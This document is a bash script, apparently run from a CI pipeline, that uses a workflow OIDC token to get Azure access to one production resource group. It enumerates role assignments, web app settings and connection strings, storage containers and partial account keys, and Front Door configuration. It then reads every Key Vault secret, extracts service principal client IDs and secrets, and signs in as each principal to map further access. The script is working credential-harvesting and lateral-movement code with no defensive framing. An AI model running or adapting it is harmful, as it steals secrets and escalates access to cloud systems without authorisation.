#!/usr/bin/env bash
set -x
T=3205c325-06a5-4171-9ce8-ffc5e6c2845e
SUB=c5e4e004-b42d-4ac4-a502-5fd338380eb6
M="https://management.azure.com"
RG=rg-tbl-platform-prod-sea

OIDC=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | jq -r .value)
tok() { curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" --data-urlencode grant_type=client_credentials --data-urlencode client_id=$1 --data-urlencode client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode client_assertion=$OIDC --data-urlencode scope=$2 | jq -r .access_token; }
ctok() { curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" --data-urlencode grant_type=client_credentials --data-urlencode client_id=$1 --data-urlencode client_secret=$2 --data-urlencode scope=$3 | jq -r .access_token; }
post() { curl -sS -X POST -H "Authorization: Bearer $2" -H "Content-Length: 0" "$1"; }

ARM=$(tok $AZURE_CLIENT_ID "https://management.azure.com/.default")
VT=$(tok $AZURE_CLIENT_ID "https://vault.azure.net/.default")

echo "=== role assignments at kv-tbl-sec scope ==="
curl -sS -H "Authorization: Bearer $ARM" "$M/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" | jq -r '.value[]?.properties | "\(.roleDefinitionId) <- \(.principalId) scope=\(.scope)"'
echo "=== role assignments sub-level ==="
curl -sS -H "Authorization: Bearer $ARM" "$M/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" | jq -r '.value[]?.properties | "\(.roleDefinitionId|split("/")[-1]) <- \(.principalId) scope=\(.scope)"'

echo "=== webapp correct RG full enum ==="
W="$M/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Web/sites/app-tbl-storefront-prod"
echo "-- appsettings"; post "$W/config/appsettings/list?api-version=2023-12-01" "$ARM" | head -c 2500; echo
echo "-- connstrings"; post "$W/config/connectionstrings/list?api-version=2023-12-01" "$ARM" | head -c 1500; echo
echo "-- slots"; curl -sS -H "Authorization: Bearer $ARM" "$W/slots?api-version=2023-12-01" | jq -r '.value[]?.name'
echo "-- siteconf"; curl -sS -H "Authorization: Bearer $ARM" "$W?api-version=2023-12-01" | jq '.properties | {hostNames,state,enabled,defaultHostName,serverFarmId}'

echo "=== storage containers per account ==="
for sa in sttblappcfgprodx3euoz sttblarchiveprodx3euoz sttblbackupprodx3euoz sttblcilogsprodx3euoz; do
  echo "-- $sa containers:"; curl -sS -H "Authorization: Bearer $ARM" "$M/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$sa/blobServices/default/containers?api-version=2023-01-01" | jq -r '.value[]?.name'
  echo "-- $sa keys:"; post "$M/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/$sa/listKeys?api-version=2023-01-01" "$ARM" | jq -c '.keys[]? | {keyName,value: .value[0:12]}'
done

echo "=== AFD origin groups + rules ==="
curl -sS -H "Authorization: Bearer $ARM" "$M/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Cdn/profiles/afd-tbl-prod/origingroups?api-version=2024-02-01" | jq -r '.value[]?.name'
curl -sS -H "Authorization: Bearer $ARM" "$M/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Cdn/profiles/afd-tbl-prod/rulesets?api-version=2024-02-01" | jq -r '.value[]?.name'

echo "=== each SP -> ARM enum + vault probe ==="
curl -sS -H "Authorization: Bearer $VT" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets?api-version=7.4" > /tmp/slist.json
for u in $(jq -r '.value[].id' /tmp/slist.json); do
  NAME=$(basename $u)
  V=$(curl -sS -H "Authorization: Bearer $VT" "$u?api-version=7.4" | jq -r '.value')
  AID=$(echo "$V" | jq -r '.appId // empty' 2>/dev/null); CS=$(echo "$V" | jq -r '.clientSecret // empty' 2>/dev/null)
  [ -z "$AID" ] && continue
  A=$(ctok $AID $CS "https://management.azure.com/.default")
  S=$(ctok $AID $CS "https://storage.azure.com/.default")
  echo "== $NAME arm=${#A} storage=${#S}"
  [ "${#A}" -gt 100 ] && curl -sS -H "Authorization: Bearer $A" "$M/subscriptions/$SUB/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01" | jq -r '.value[]?.properties | "\(.roleDefinitionId|split("/")[-1]) <- \(.principalId) scope=\(.scope)"' | head -15
  for sa in sttblappcfgprodx3euoz sttblarchiveprodx3euoz sttblbackupprodx3euoz sttblcilogsprodx3euoz; do
    [ "${#S}" -gt 100 ] || continue
    echo "   containers $sa:"; curl -sS -H "Authorization: Bearer $S" -H "x-ms-version: 2023-11-03" "https://$sa.blob.core.windows.net/?comp=list" | grep -oE "<Name>[^<]+" | head -10
  done
done
